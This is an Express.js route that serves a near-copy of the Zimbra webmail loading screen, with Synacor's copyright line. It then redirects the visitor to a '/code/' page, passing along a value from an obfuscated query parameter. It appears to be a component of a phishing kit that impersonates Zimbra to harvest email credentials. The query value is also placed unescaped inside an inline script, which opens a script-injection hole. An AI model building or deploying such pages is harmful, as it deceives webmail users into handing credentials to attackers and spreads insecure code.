
const express = require ('express');
const router = express.Router();


router.use(express.static('public'));

//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data = req.query.sdjkhfjdshfjkhdjkfhuewrghjfdghkdfe;

    const url = `/code/?gdjfghfdhgjfdgfdgkldfjgkldfjlgdkjglkjfdl=${data}`;

    if (data == null) {
    res.render('error');
    
  }else{


    const htmlContent = `
   <!DOCTYPE html>
<html class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths template user_font_size_normal" lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="Pragma" content="no-cache">
    <title>Zimbra</title>
    <link href="./stylesheet/common,login,zhtml,skin.css" rel="stylesheet" type="text/css">
       <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 2000);
            </script> 
    
    <link rel="SHORTCUT ICON" href="./images/favicon.ico" id="DWT2" type="image/x-icon">

  </head>
  <body class="user_font_system" style="margin: 0px; overflow: hidden;">
    <div style="display:none;">
     
    </div>
 

  
    <div id="skin_container_splash_screen" class="SplashScreen">
    
      <div id="ZSplashPanel" class="center">
        <div class="contentBox">
          <h1>
            <div id="ZLoginBannerImage" class="ImgLoginBanner" onclick="showCompanyUrl()"></div>
          </h1>
          <div id="ZLoginAppName">
            <script>
              if (!window.isOffline) {
                document.write(ZmMsg.splashScreenAppName)
              }
            </script>Web Client
          </div>
          <div id="#ZSplashBodyContainer" class="content">
            <div class="message">
              <script>
                document.write(ZmMsg.splashScreenLoading)
              </script>Loading ...
            </div>
          </div>
        </div>
        <div class="decor1"></div>
      </div>
      <div class="Footer">
        <div class="copyright">
          Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.
        </div>
      </div>
      <div class="decor2"></div>
    </div>
    
    <div style="display:none;">
     
    </div>
    <div id="z_shell" class="DwtShell" style="height: 100%; width: 100%; position: absolute;">
      <div id="DWT1" class="DwtControl" tabindex="0" parentid="z_shell" style="position: absolute; overflow: visible; width: 100%; height: 100%; z-index: 300;">
        <div id="skin_outer" style="display: block;">
          <div id="skin_layout_outer" class="skin_layout">
            <div id="skin_tr_top_ad" class="skin_outer_ad skin_layout_row">
              
  </body>
</html>


    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router